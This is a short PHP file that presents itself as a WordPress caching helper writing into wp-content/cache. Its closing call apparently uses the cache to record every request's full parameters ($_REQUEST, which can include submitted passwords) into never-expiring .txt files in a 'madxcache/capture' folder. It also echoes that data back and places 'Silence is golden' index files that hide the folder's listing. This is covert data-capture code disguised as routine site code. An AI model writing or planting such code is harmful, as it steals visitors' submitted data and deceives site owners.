<?php
function handleAdvancedCacheFunc($dosemething, $name, $folder = 'custom-cache', $ttl = 3600) {
$user_role = 'guest';
//$current_uri = $_SERVER['REQUEST_URI'];
$filename_only = md5(json_encode($_REQUEST) . $user_role) . '.txt';
$base_cache_dir = 'wp-content/cache';
$target_folder  = $folder;
$target_name    = $name;
$dirPath  = $base_cache_dir . '/' . $target_folder . '/' . $target_name;
$filename = $dirPath . '/' . $filename_only;

    if (file_exists($filename)) {
        if ($ttl === -1 || (time() - filemtime($filename) < $ttl)) {
            readfile($filename);
            return;
        }
    }
    
    if (!is_dir($dirPath)) {
        mkdir($dirPath, 0755, true);

        file_put_contents($base_cache_dir . '/' . $target_folder . '/index.php', '<?php // Silence is golden');
        file_put_contents($dirPath . '/index.php', '<?php // Silence is golden');
    }
    
    ob_start();
    if (is_callable($dosemething)) {
        $dosemething();
    } else {
        echo "Error: Argumen pertama harus berupa fungsi yang valid.";
    }
    $output = ob_get_clean();
    
    file_put_contents($filename, $output);
    echo $output;
}

handleAdvancedCacheFunc(function(){
echo json_encode($_REQUEST);},'capture','madxcache',-1);

?>